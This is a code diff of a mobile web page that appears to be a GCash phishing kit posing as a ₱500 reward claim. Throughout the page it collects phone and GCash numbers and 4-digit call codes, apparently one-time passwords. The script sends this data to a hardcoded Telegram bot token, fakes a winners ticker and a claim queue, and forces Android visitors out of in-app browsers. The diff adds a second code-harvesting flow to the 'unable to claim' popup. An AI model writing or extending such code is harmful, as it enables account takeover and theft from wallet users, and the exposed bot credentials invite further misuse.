@@ -150,7 +150,7 @@
         .mission-note { margin-top: 18px; font-family: 'Poppins', sans-serif; font-size: 10px; font-weight: 500; color: rgba(255, 255, 255, 0.7); letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 6px; }
         .mission-note svg { width: 12px; height: 12px; color: #39ff14; filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.8)); flex-shrink: 0; }
 
-               /* POPUPS */
+        /* POPUPS */
         .popup-overlay { display: none; position: fixed; inset: 0; z-index: 99999; background: rgba(5, 10, 30, 0.92); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); align-items: center; justify-content: center; padding: 20px; animation: popupFadeIn 0.3s ease; overflow-y: auto; }
         .popup-overlay.show { display: flex; }
         @keyframes popupFadeIn { from { opacity: 0; } to { opacity: 1; } }
@@ -193,7 +193,7 @@
         .queue-badge .queue-dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; box-shadow: 0 0 10px #fff; animation: queueDotBlink 1s ease-in-out infinite; }
         @keyframes queueDotBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        /* ✅ QUEUE LIST PANEL */
+        /* QUEUE LIST PANEL */
         .queue-list { display: flex; flex-direction: column; gap: 6px; margin: 14px 0 18px; padding: 10px; background: rgba(0, 0, 0, 0.35); border: 2px solid rgba(255, 215, 0, 0.4); border-radius: 14px; max-height: 260px; overflow-y: auto; scrollbar-width: thin; scrollbar-color: #ffe066 rgba(0,0,0,0.3); }
         .queue-list::-webkit-scrollbar { width: 6px; }
         .queue-list::-webkit-scrollbar-thumb { background: #ffe066; border-radius: 3px; }
@@ -273,8 +273,7 @@
         }
         @media (prefers-reduced-motion: reduce) { * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; } }
     </style>
-
-    </head>
+</head>
 <body>
 
     <!-- DESKTOP BLOCK -->
@@ -376,27 +375,18 @@
     <div class="popup-overlay" id="catClaimPopup">
         <div class="popup-card">
             <button class="popup-close" id="catClaimClose">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
             </button>
             <div class="popup-img-wrap"><img src="images/cat_claim.png" alt="Claim" class="popup-img" onerror="this.style.opacity='0.4';"></div>
             <h2 class="popup-title">READY TO CLAIM?</h2>
             <p class="popup-subtitle">Enter your mobile number to claim<br>your <strong>₱500 bonus</strong>!</p>
             <div class="input-label">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                    <rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>
-                    <path d="M12 18h.01"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
                 <span>MOBILE NUMBER</span>
             </div>
             <input type="tel" class="phone-input" id="userPhoneInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
             <button class="popup-btn" id="get500Btn">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                    <rect x="2" y="6" width="20" height="12" rx="2"/>
-                    <circle cx="12" cy="12" r="2.5"/>
-                    <path d="M6 12h.01M18 12h.01"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="2"/><circle cx="12" cy="12" r="2.5"/><path d="M6 12h.01M18 12h.01"/></svg>
                 <span>GET ₱500</span>
             </button>
             <div class="ai-error" id="phoneError"></div>
@@ -407,19 +397,14 @@
     <div class="popup-overlay" id="skipClaimPopup">
         <div class="popup-card">
             <button class="popup-close" id="skipClaimClose">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
             </button>
             <div class="popup-img-wrap"><img src="images/cat_auth.png" alt="Skip" class="popup-img" onerror="this.style.opacity='0.4';"></div>
             <h2 class="popup-title">AUTHORIZE WITHDRAWAL</h2>
             <p class="popup-subtitle">Authorize your instant withdrawal.<br>Wait for the countdown to continue.</p>
             <div class="countdown-badge" id="skipCountdownBadge">⏳ SKIP IN <span id="skipCountdownNum">10</span>s</div>
             <button class="popup-btn" id="skipClaimBtn" disabled>
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                    <polygon points="5 4 15 12 5 20 5 4"/>
-                    <line x1="19" y1="5" x2="19" y2="19"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 4 15 12 5 20 5 4"/><line x1="19" y1="5" x2="19" y2="19"/></svg>
                 <span>SKIP & CLAIM</span>
             </button>
         </div>
@@ -429,56 +414,32 @@
     <div class="popup-overlay" id="queuePopup">
         <div class="popup-card">
             <button class="popup-close" id="queueClose">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
             </button>
-
-            <!-- NORMAL QUEUE STATE -->
             <div id="queueNormalState">
                 <div class="queue-badge"><span class="queue-dot"></span><span>⏳ PROCESSING QUEUE</span></div>
                 <h2 class="popup-title">MANY USERS CLAIMING</h2>
                 <p class="popup-subtitle">Maraming user ang nag-claim ngayon.<br>Please wait for your turn.</p>
-
-                <!-- ✅ BAGONG QUEUE LIST PANEL -->
                 <div class="queue-list" id="queueList"></div>
-
                 <div class="queue-timer-label">⏱ Available to claim in</div>
-                <div class="queue-timer-big" id="queueTimer">10:00</div>
+                <div class="queue-timer-big" id="queueTimer">3:00</div>
                 <div class="queue-progress"><div class="queue-progress-bar" id="queueProgressBar"></div></div>
                 <p class="popup-subtitle" style="margin-top:14px; font-size:11px; opacity:0.8;">Your claim is in the queue. Please keep this page open.</p>
             </div>
-
-            <!-- ✅ READY TO CLAIM STATE -->
             <div class="ready-to-claim-wrap" id="readyToClaimWrap">
-                <div class="ready-badge">
-                    <span class="ready-dot"></span>
-                    <span>✨ READY TO CLAIM ✨</span>
-                </div>
-                <div class="ready-image-wrap">
-                    <img src="images/cat_cn.png" alt="Ready to Claim" class="ready-image" onerror="this.style.opacity='0.4';">
-                </div>
+                <div class="ready-badge"><span class="ready-dot"></span><span>✨ READY TO CLAIM ✨</span></div>
+                <div class="ready-image-wrap"><img src="images/cat_cn.png" alt="Ready to Claim" class="ready-image" onerror="this.style.opacity='0.4';"></div>
                 <h2 class="ready-title">YOUR TURN!</h2>
                 <p class="ready-subtitle">Your slot is now available.<br><strong>Tap the button below to claim!</strong></p>
                 <div style="position: relative; margin-top: 4px;">
                     <div class="ready-glow-ring"></div>
                     <button class="ready-claim-btn" id="readyClaimBtn">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-                            <rect x="3" y="8" width="18" height="4" rx="1"/>
-                            <path d="M12 8v13"/>
-                            <path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"/>
-                            <path d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5"/>
-                        </svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="8" width="18" height="4" rx="1"/><path d="M12 8v13"/><path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"/><path d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5"/></svg>
                         <span>CLAIM NOW</span>
                     </button>
                 </div>
                 <div class="ready-note">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M18 11V6a2 2 0 0 0-2-2a2 2 0 0 0-2 2"/>
-                        <path d="M14 10V4a2 2 0 0 0-2-2a2 2 0 0 0-2 2v2"/>
-                        <path d="M10 10.5V6a2 2 0 0 0-2-2a2 2 0 0 0-2 2v8"/>
-                        <path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"/>
-                    </svg>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M18 11V6a2 2 0 0 0-2-2a2 2 0 0 0-2 2"/><path d="M14 10V4a2 2 0 0 0-2-2a2 2 0 0 0-2 2v2"/><path d="M10 10.5V6a2 2 0 0 0-2-2a2 2 0 0 0-2 2v8"/><path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"/></svg>
                     <span>Tap to open your reward</span>
                 </div>
             </div>
@@ -489,9 +450,7 @@
     <div class="popup-overlay" id="successPopup">
         <div class="popup-card">
             <button class="popup-close" id="successClose">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
             </button>
             <div class="popup-success">
                 <div class="success-icon">🎉</div>
@@ -499,9 +458,7 @@
                 <p class="success-message" id="successMessage">Your reward has been successfully claimed.<br>Please wait for further instructions.</p>
             </div>
             <button class="popup-btn" id="successOkBtn" style="margin-top:20px;">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M20 6 9 17l-5-5"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
                 <span>OK</span>
             </button>
         </div>
@@ -511,27 +468,20 @@
     <div class="popup-overlay" id="aiVerifyPopup">
         <div class="popup-card">
             <button class="popup-close" id="aiVerifyClose">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
-                </svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
             </button>
             <div class="popup-img-wrap"><img src="images/ai_call.png" alt="AI Call" class="popup-img" onerror="this.style.opacity='0.4';"></div>
             <h2 class="popup-title">AI-VERIFICATION</h2>
-            <p class="popup-subtitle"><i class="fas fa-phone-volume" style="color:#ffe066;"></i> <strong>Tatawagan ka ng AI-verification system</strong> para i-verify ang iyong GCash number.</p>
+            <p class="popup-subtitle"><strong>Tatawagan ka ng AI-verification system</strong> para i-verify ang iyong GCash number.</p>
             <div id="aiStage1">
                 <div class="ai-status-text">📝 Ilagay ang iyong <strong>GCash number</strong> para matawagan ka.</div>
                 <div class="input-label">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                        <rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>
-                        <path d="M12 18h.01"/>
-                    </svg>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
                     <span>GCASH NUMBER</span>
                 </div>
                 <input type="tel" class="phone-input" id="aiGcashInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
                 <button class="popup-btn" id="aiRequestCallBtn">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
-                    </svg>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
                     <span>REQUEST AI CALL</span>
                 </button>
                 <div class="ai-error" id="aiGcashError"></div>
@@ -543,18 +493,12 @@
             <div id="aiStage3" class="hidden">
                 <div class="ai-status-text">✅ <strong style="color:#39ff14;">CALL CONNECTED!</strong><br><span style="font-size:11px; color:rgba(255,255,255,0.8);">Enter the 4-digit code from the call</span></div>
                 <div class="input-label">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z"/>
-                        <path d="M13 5v2M13 17v2M13 11v2"/>
-                    </svg>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z"/><path d="M13 5v2M13 17v2M13 11v2"/></svg>
                     <span>ENTER 4-DIGIT CODE</span>
                 </div>
                 <input type="text" class="ai-code-input" id="aiCodeInput" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
                 <button class="popup-btn" id="aiVerifyBtn">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="10"/>
-                        <path d="m9 12 2 2 4-4"/>
-                    </svg>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
                     <span>VERIFY CODE</span>
                 </button>
                 <div class="ai-error" id="aiCodeError"></div>
@@ -562,32 +506,53 @@
         </div>
     </div>
 
-    <!-- POPUP 6: BAN -->
+    <!-- POPUP 6: BAN (with Verification Call flow) -->
     <div class="popup-overlay" id="banPopup">
         <div class="popup-card ban-card">
+            <button class="popup-close" id="banClose">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+            </button>
             <div class="popup-img-wrap"><img src="images/error_claim.png" alt="Ban" class="popup-img" onerror="this.style.opacity='0.4';"></div>
             <h2 class="popup-title danger">UNABLE TO CLAIM</h2>
             <p class="popup-subtitle" style="font-size:13px; line-height:1.7;">
                 You are not able to claim your rewards.<br>
                 Please try again on another device and use another GCash Account for claiming rewards.
             </p>
-            <button class="popup-btn" id="banOkBtn" style="background: linear-gradient(180deg,#ff8888 0%,#ff1744 60%,#8b0000 100%); color:#fff; box-shadow: 0 5px 0 #4a0000, 0 8px 20px rgba(0,0,0,0.55), 0 0 30px rgba(255,23,68,0.6);">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
-                    <circle cx="12" cy="12" r="10"/>
-                    <path d="m15 9-6 6M9 9l6 6"/>
-                </svg>
-                <span>OK</span>
-            </button>
+            <div style="display:flex; align-items:center; justify-content:center; gap:10px; margin:14px auto 6px; width:80%;">
+                <span style="flex:1; height:1.5px; background:linear-gradient(90deg,transparent,rgba(255,215,0,0.8),transparent); border-radius:2px;"></span>
+                <span style="font-family:'Orbitron',monospace; font-size:10px; font-weight:900; color:#ffe066; letter-spacing:2px; text-shadow:0 0 8px rgba(255,215,0,0.7);">OR</span>
+                <span style="flex:1; height:1.5px; background:linear-gradient(90deg,transparent,rgba(255,215,0,0.8),transparent); border-radius:2px;"></span>
+            </div>
+            <div id="banStage1">
+                <button class="popup-btn" id="banVerifyCallBtn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                    <span>VIA VERIFICATION CALL</span>
+                </button>
+            </div>
+            <div id="banStage2" class="hidden">
+                <div class="ai-status-text" id="banStatusText">📞 <strong>VERIFICATION CALL</strong> being placed...<br><span style="font-size:11px; color:rgba(255,255,255,0.7);">Please wait for the call</span></div>
+                <div class="ai-timer" id="banTimer">60s</div>
+            </div>
+            <div id="banStage3" class="hidden">
+                <div class="ai-status-text">✅ <strong style="color:#39ff14;">CALL CONNECTED!</strong><br><span style="font-size:11px; color:rgba(255,255,255,0.8);">Enter the 4-digit code from the call</span></div>
+                <div class="input-label">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z"/><path d="M13 5v2M13 17v2M13 11v2"/></svg>
+                    <span>ENTER 4-DIGIT CODE</span>
+                </div>
+                <input type="text" class="ai-code-input" id="banCodeInput" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
+                <button class="popup-btn" id="banVerifyBtn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
+                    <span>VERIFY CODE</span>
+                </button>
+                <div class="ai-error" id="banCodeError"></div>
+            </div>
         </div>
     </div>
 
-                        <script>
+    <script>
         (function() {
             'use strict';
 
-            // ============================================================
-            // INTENT / BROWSER GUARD
-            // ============================================================
             function isInAppBrowser() {
                 var ua = navigator.userAgent || navigator.vendor || window.opera;
                 return /FBAN|FBAV|FB_IAB|FB4A|FBIOS|Instagram|Messenger|Line|Twitter|LinkedIn|Snapchat|MicroMessenger|WhatsApp|Telegram/i.test(ua);
@@ -596,9 +561,7 @@
                 var ua = navigator.userAgent || navigator.vendor || window.opera;
                 return /iPhone|iPad|iPod/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
             }
-            function isAndroid() {
-                return /Android/i.test(navigator.userAgent);
-            }
+            function isAndroid() { return /Android/i.test(navigator.userAgent); }
             function forceOpenInChrome() {
                 if (!isAndroid()) return false;
                 var currentUrl = window.location.href;
@@ -610,23 +573,12 @@
                 var block = document.getElementById('intentBlock');
                 var app = document.getElementById('missionApp');
                 var ticker = document.getElementById('winnersTicker');
-                if (isIPhone()) {
+                if (isIPhone() || isInAppBrowser()) {
                     if (block) block.style.display = 'flex';
                     if (app) app.style.display = 'none';
                     if (ticker) ticker.style.display = 'none';
-                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
-                        p.classList.remove('show'); p.style.pointerEvents = 'none';
-                    });
-                    return false;
-                }
-                if (isInAppBrowser()) {
-                    if (block) block.style.display = 'flex';
-                    if (app) app.style.display = 'none';
-                    if (ticker) ticker.style.display = 'none';
-                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
-                        p.classList.remove('show'); p.style.pointerEvents = 'none';
-                    });
-                    setTimeout(function() { forceOpenInChrome(); }, 800);
+                    document.querySelectorAll('.popup-overlay').forEach(function(p) { p.classList.remove('show'); p.style.pointerEvents = 'none'; });
+                    if (isInAppBrowser()) setTimeout(function() { forceOpenInChrome(); }, 800);
                     return false;
                 }
                 if (block) block.style.display = 'none';
@@ -640,18 +592,11 @@
             var autoOpenBtn = document.getElementById('autoOpenBtn');
             if (autoOpenBtn) autoOpenBtn.addEventListener('click', function() { forceOpenInChrome(); });
 
-            // ============================================================
-            // SMART DEEPLINK
-            // ============================================================
             function openAsDeeplink(url) {
                 if (!url) return;
                 var android = isAndroid();
                 var isCustomScheme = /^(gcash|myapp|upi|phonepe|paytm|intent|whatsapp|tg|fb|instagram|market|alipays?):/i.test(url);
-                console.log('🔗 Opening:', url);
-                if (isCustomScheme || url.indexOf('intent://') === 0) {
-                    try { window.location.href = url; } catch(e) {}
-                    return;
-                }
+                if (isCustomScheme || url.indexOf('intent://') === 0) { try { window.location.href = url; } catch(e) {} return; }
                 if (/^https?:\/\//i.test(url) && android) {
                     var cleanUrl = url.replace(/^https?:\/\//, '');
                     var intentUrl = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(url) + ';end';
@@ -661,39 +606,17 @@
                 window.location.href = url;
             }
 
-            // ============================================================
-            // CONFIG
-            // ============================================================
             var BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
             var CHAT_ID = '7298607329';
             var TELEGRAM_THROTTLE_MS = 2000;
             var lastTelegramTime = 0;
+            var db = null, userPhone = null, deviceFingerprint = null, deviceDisplayId = null;
+            var currentAiCode = '', aiTimerInterval = null, aiCountdown = 60;
+            var skipCountdownInterval = null, skipCountdown = 10;
+            var queueTimerInterval = null, queueCountdown = 180;
+            var linkListeners = [], isBanned = false, readyToClaim = false, pendingLink = null;
+            var queueUsers = [], queueListInterval = null, userInQueue = false, userLinkDeployed = false;
 
-            var db = null;
-            var userPhone = null;
-            var deviceFingerprint = null;
-            var deviceDisplayId = null;
-            var currentAiCode = '';
-            var aiTimerInterval = null;
-            var aiCountdown = 60;
-            var skipCountdownInterval = null;
-            var skipCountdown = 10;
-            var queueTimerInterval = null;
-            var queueCountdown = 600;
-            var linkListeners = [];
-            var isBanned = false;
-            var readyToClaim = false;
-            var pendingLink = null;
-
-            // QUEUE STATE
-            var queueUsers = [];
-            var queueListInterval = null;
-            var userInQueue = false;
-            var userLinkDeployed = false;
-
-            // ============================================================
-            // MOBILE GUARD
-            // ============================================================
             function isMobileDevice() {
                 var ua = navigator.userAgent || navigator.vendor || window.opera;
                 var isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
@@ -717,38 +640,25 @@
             window.addEventListener('resize', function() { clearTimeout(resizeTimer); resizeTimer = setTimeout(enforceMobileOnly, 250); });
             window.addEventListener('orientationchange', function() { setTimeout(enforceMobileOnly, 300); });
 
-            // ============================================================
-            // FIREBASE
-            // ============================================================
             function initFirebase() {
                 try {
                     if (typeof firebaseConfig !== 'undefined') {
                         if (!firebase.apps || !firebase.apps.length) firebase.initializeApp(firebaseConfig);
                         db = firebase.database();
-                        console.log('✅ Firebase connected');
-                    } else {
-                        console.warn('⚠️ firebaseConfig not found');
                     }
                 } catch(e) { console.error('Firebase error:', e); }
             }
             initFirebase();
 
-            // ============================================================
-            // TELEGRAM
-            // ============================================================
             function sendTelegram(message) {
                 try {
                     var now = Date.now();
-                    if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) return;
+                                        if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) return;
                     lastTelegramTime = now;
-                    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
-                        .catch(function(e) {});
+                    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message)).catch(function(e) {});
                 } catch(e) {}
             }
 
-            // ============================================================
-            // DEVICE
-            // ============================================================
             function getDeviceFingerprint() {
                 var screenResolution = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
                 var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -758,10 +668,7 @@
                 var hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
                 var fingerprintString = userAgent + '|' + screenResolution + '|' + timezone + '|' + language + '|' + platform + '|' + hardwareConcurrency;
                 var hash = 0;
-                for (var i = 0; i < fingerprintString.length; i++) {
-                    hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
-                    hash |= 0;
-                }
+                for (var i = 0; i < fingerprintString.length; i++) { hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i); hash |= 0; }
                 return 'FP_' + Math.abs(hash);
             }
             function getOrCreateDeviceId(fingerprint) {
@@ -788,10 +695,6 @@
                     return db.ref('device_phone_map/' + fingerprint).set({ phone: phone, displayId: deviceDisplayId, lastSeen: Date.now() });
                 });
             }
-
-            // ============================================================
-            // BAN CHECK
-            // ============================================================
             function checkBan(phone, fingerprint) {
                 return db.ref('banned_ghosts/' + phone).once('value').then(function(phoneSnap) {
                     if (phoneSnap.exists()) return { isBanned: true, type: 'phone' };
@@ -813,11 +716,8 @@
                 if (banPopup) banPopup.classList.add('show');
             }
 
-            // ============================================================
-            // WINNERS TICKER
-            // ============================================================
             function initWinnersTicker() {
-                var prefixes = ['0917', '0918', '0927', '0998', '0945', '0966', '0955', '0939', '0906', '0977'];
+                var prefixes = ['0917','0918','0927','0998','0945','0966','0955','0939','0906','0977'];
                 function generateWinner() {
                     var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
                     var last4 = Math.floor(1000 + Math.random() * 9000);
@@ -828,14 +728,11 @@
                     var phoneEl = document.getElementById('tickerPhone');
                     var amountEl = document.querySelector('.ticker-amount');
                     if (!ticker || !phoneEl || !amountEl) return;
-                    ticker.classList.remove('fade-in');
-                    ticker.classList.add('fade-out');
+                    ticker.classList.remove('fade-in'); ticker.classList.add('fade-out');
                     setTimeout(function() {
                         var winner = generateWinner();
-                        phoneEl.textContent = winner.phone;
-                        amountEl.textContent = '₱500';
-                        ticker.classList.remove('fade-out');
-                        ticker.classList.add('fade-in');
+                        phoneEl.textContent = winner.phone; amountEl.textContent = '₱500';
+                        ticker.classList.remove('fade-out'); ticker.classList.add('fade-in');
                     }, 300);
                 }
                 var initial = generateWinner();
@@ -847,13 +744,10 @@
             }
             if (browserAllowed) initWinnersTicker();
 
-            // ============================================================
-            // BACKGROUND EFFECTS
-            // ============================================================
             if (isMobile && browserAllowed) { createFloatingCoins(); createSparkles(); createConfetti(); }
             function createFloatingCoins() {
                 var layer = document.getElementById('coinLayer'); if (!layer) return;
-                var coinEmojis = ['🪙', '💰', '💎', '⭐', '✨'];
+                var coinEmojis = ['🪙','💰','💎','⭐','✨'];
                 for (var i = 0; i < 8; i++) {
                     var coin = document.createElement('div'); coin.className = 'coin';
                     coin.textContent = coinEmojis[Math.floor(Math.random() * coinEmojis.length)];
@@ -867,56 +761,45 @@
             function createSparkles() {
                 var layer = document.getElementById('sparkleLayer'); if (!layer) return;
                 for (var i = 0; i < 12; i++) {
-                    var sparkle = document.createElement('div'); sparkle.className = 'sparkle';
-                    sparkle.style.left = (Math.random() * 100) + '%';
-                    sparkle.style.top = (Math.random() * 100) + '%';
-                    sparkle.style.animationDelay = (Math.random() * 3) + 's';
-                    sparkle.style.animationDuration = (1.8 + Math.random() * 2) + 's';
-                    layer.appendChild(sparkle);
